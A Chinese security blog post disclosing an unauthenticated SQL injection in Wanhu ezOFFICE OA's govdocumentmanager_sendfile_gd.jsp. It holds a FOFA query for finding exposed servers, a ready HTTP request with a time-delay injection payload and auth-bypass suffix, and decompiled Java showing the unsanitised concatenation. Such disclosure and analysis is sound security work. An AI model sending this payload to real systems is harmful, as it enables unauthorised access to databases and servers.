---
title: "万户OA govdocumentmanager_sendfile_gd.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-govdocumentmanager_sendfile_gd-sqli.html
asset_dir: assets/万户oa-govdocumentmanager_sendfile_gd.jsp-sql注入漏洞
---

# 万户OA govdocumentmanager\_sendfile\_gd.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/14 18:20
* 1489浏览
* [0评论](#comment)
* 28分钟阅读

深入探索

SQL

万户网络

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入检测工具

# 0x02 漏洞概述

万户 ezOFFICE modules/govoffice/gov\_documentmanager/govdocumentmanager\_sendfile\_gd.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

深入探索

数据库

安全运维咨询

漏洞扫描器

# 漏洞复现

```
GET /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_sendfile_gd.jsp;.js?sendFileId=1%3Bwaitfor%20delay%270%3A0%3A4%27 HTTP/1.1
Host: ezoffice.mrxn.net
```

成功延时 4 秒

代码安全审计

[[![万户OA govdocumentmanager_sendfile_gd.jsp SQL注入漏洞](images/img-001-770bdfcb7f36.png)](https://mrxn.net/content/uploadfile/202501/2b581736773137.png)](https://mrxn.net/content/uploadfile/202501/2b581736773137.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

modules/govoffice/gov\_documentmanager/govdocumentmanager\_sendfile\_gd.jsp 主要业务逻辑代码如下，非常简单！

深入探索

文本剥离工具

安全研究工具

服务器安全服务

## SAVESIGNATURE

```
<%
//System.out.print("\n------ENTER 1--------\n");
String sendFileId = request.getParameter("sendFileId");
com.whir.ezoffice.workflow.common.util.WorkflowCommon workflowCommon = new com.whir.ezoffice.workflow.common.util.WorkflowCommon();
com.whir.govezoffice.documentmanager.bd.SendFileBD sendFileBD = new com.whir.govezoffice.documentmanager.bd.SendFileBD();
java.util.Map wfMap = sendFileBD.getDocWF(sendFileId, "2");
```

主要关注 这一行

漏洞预警服务

```
java.util.Map wfMap = sendFileBD.getDocWF(sendFileId, "2");
```

跟进 `com.whir.govezoffice.documentmanager.bd.SendFileBD()` 下的 `getDocWF` 方法看下

```
public Map getDocWF(String id, String moduleId) {
        ParameterGenerator pg = new ParameterGenerator(2);
        Map result = null;

        try {
            EJBProxy ejbProxy = new GovDocumentManagerEJBProxy("SendFileEJB", "SendFileEJBLocal", SendFileEJBHome.class);
            pg.put(id, String.class);
            pg.put(moduleId, String.class);
            result = (Map)ejbProxy.invoke("getDocWF", pg.getParameters());
        } catch (Exception e) {
            logger.error("error to getDocWF information :" + e.getMessage());
        }

        return result;
    }
```

继续跟进 `SendFileEJB`

```
public Map getDocWF(String id, String moduleId) throws Exception {
        Map result = new HashMap();
        this.begin();

        try {
            Connection conn = this.session.connection();
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT WF_IMMOFORM_ID FROM EZOFFICE.WF_IMMOBILITYFORM WHERE WF_MODULE_ID=" + moduleId);
            String tableId = "";
            String processId = "";
            if (rs.next()) {
                tableId = rs.getString(1);
            }

            rs = stmt.executeQuery("SELECT WORKPROCESS_ID FROM WF_WORK WHERE MODULEID=2  AND WORKRECORD_ID=" + id);
            if (rs.next()) {
                processId = rs.getString(1);
            }
```

最终 `sendFileId` 也是拼接进SQL语句中，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，还是这么朴实无华！

广告与营销

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.0x01 产品简介](#toc-1-)
* [2.0x02 漏洞概述](#toc-2-)
* [3.0x03 复现环境](#toc-3-)
* [4.漏洞复现](#toc-4-)
* [5.漏洞分析](#toc-5-)
* [5.1.SAVESIGNATURE](#toc-5-1-)
* [6.最后](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万户OA govdocumentmanager\_sendfile\_gd.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-govdocumentmanager_sendfile_gd-sqli.html)  
文章链接：<https://mrxn.net/jswz/defaultroot-ezOFFICE-govdocumentmanager_sendfile_gd-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-govdocumentmanager\_sendfile\_gd-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAN0UlEQVR4Aeyc3XbbSAyD8/X937kbDAxpSM/YTrqtc6E9RTEEQEoR7bh/Z399fHz8/ip+3/5T3+14kLQZh3E7xLuVy2s/8tQfPywtWGnyou94zugs9Ky0FXpO9Sr3iqaFfHwOeAmfA+9+AB/AnR4BGD6Yu55anPvQWUgdliZAnSWtZ6TNAPdA5WTUn3MYnE29Y9jnNPcVZPZYSIqL3/8EykLAm4bKj24z2wf3pN5xZs1+NPCMXR09DDUffeZcJ1rqcHQx1HmrjHLRw9KeATwbKve+spBuXvW/fwJ/tBC9QsAb11nIlwDWU4eVEcA+EOtgYHzuRADX6hOi6yykFkPNgmt5jwAcn6PJQe3VtQSwDmZpApDWb/MfLeTbV70at0/gjxeiV4YAjFc1mKUJuTJYB7O8jmTD3Qf3xoezhvMcf+bMAuegsvw5r7M0QWcB3KPzCnN25b+i/fFCXrnIlXn9CZSFaMMr7MaBXzFw//03PeBM6sxPLYZ1BqyDWdkZmTVzfHBPPHAdP3oYiHV8lgDjXR8j2XD0Vzg9nXtvWUg3v11fjd9+AmMh4FcCPObVVbJxcO+u7r3g/Kw/640/9+gMiAqSBcarPHUJfRZw+uDzp7z8Ac/93gjugcecvrGQFBe//wn8yivnKzzfNnjzszafwX7mw3095x+dwb09o9ldA2flCfF1FnoNRDpYOQEY77IY8LhWTn3fwfUO0dP7QSgLAW8eKud+wXrqmfNqAGdSh8H63KNzfDGsM8qtAM7DyclpngCnB/fnOZ8zOJdac1aIPzO4FyrPGZ2h+uD6FyB/IBcdxeKn+MB4C6tODE7tK7r6wb06zwDrmjcjmVnLOd6Oew58DWDXcujA+LrBHCMzV5wM1J7oncs7pJtX/e+fwFgI1O31TYN9MK9uMz3gDJiTBdfJzXrX4nUGz1jp0fqsXoNnRJ+5zwBno3dOLzgH95xM700dPzwWEvPi9z+BsZBsZ3c78cOrHPjVES/ZzuBcdOXhXpMewPBTvsTgHjD3JrAOZvm5Jzg16eA6fhjudeWFZHQWUkPtkTdjLGQWrvN7n0BZCHh7uSVY1/O2k40WBveCuefg1NPTM7s6OniG+lea9CB+6s7gWXD+QemjDJw5cK+ukR6dBbAH5u4rM6MsZDau83ueQFnIbntQtwuuX7nl3cxZB8+DynNG10odliYAoiWA8XuH3rMKJwPuSQZq3fX0SYd1NhmwD2suC9HAC+99AmMhsN5WvzVwLrq2njPYA7M8AVyDOfmZlRNmTWfY98hXT6BaSA3uTS1vBtgHszzwOT1Qa2WE+DoL4JzO3UsNZ0a5juTGQrp51e97Ass/ft/dTrYYH8jx4GSA8r2762mQPp/nOnoYPBPM0cVgDczSBKi1NEHXEXQWdA6g9sC6Tj6sOTv0TK/B17jeIbsn+CZ9LAS8HTDnXrLFMNhPLU52x+Ce+OoRoOrywZr8GWBdmWdIX89BnQG3+hYE18BN+Tj+sUNmdj6CtwMwvisAN+XjqIFxzgyo9cftv7GQ2/miH/AElgvpW4S6TXCt+09WZwFOT3X3pc0AjvJZ9gi2A6x/1zzHMhsor9RVZtZ0BvfoLIBrMEsTcg2x6kdQRoA646W/oFKjAG7WW